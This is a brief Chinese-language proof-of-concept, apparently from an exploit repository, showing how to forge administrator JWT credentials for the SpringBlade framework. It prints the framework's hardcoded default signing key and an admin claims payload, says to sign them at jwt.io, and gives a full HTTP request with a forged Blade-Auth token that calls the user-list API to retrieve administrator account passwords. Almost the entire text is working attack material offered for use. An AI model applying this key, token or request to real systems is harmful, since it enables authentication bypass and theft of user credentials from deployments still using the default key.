## Springblade默认密钥可伪造凭据

## 默认密钥
```
String SIGN_KEY = "bladexisapowerfulmicroservicearchitectureupgradedandoptimizedfromacommercialproject";
```

## poc
```
{
  "tenant_id": "000000",
  "tenant_code":"000000",
  "user_name": "admin",
  "role_name": "administrator",
  "nick_name": "管理员",
  "account": "admin"
}
```
在 https://jwt.io/ 中填入上面得poc和密钥，即可得到jwt加的凭据

![image](https://github.com/wy876/POC/assets/139549762/042c7596-fa3a-4d25-ad0a-3c67d9fcecd8)


## 构造凭据获取管理员用户账户密码
```
GET /api/blade-user/user-list HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
Blade-Auth: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ
```
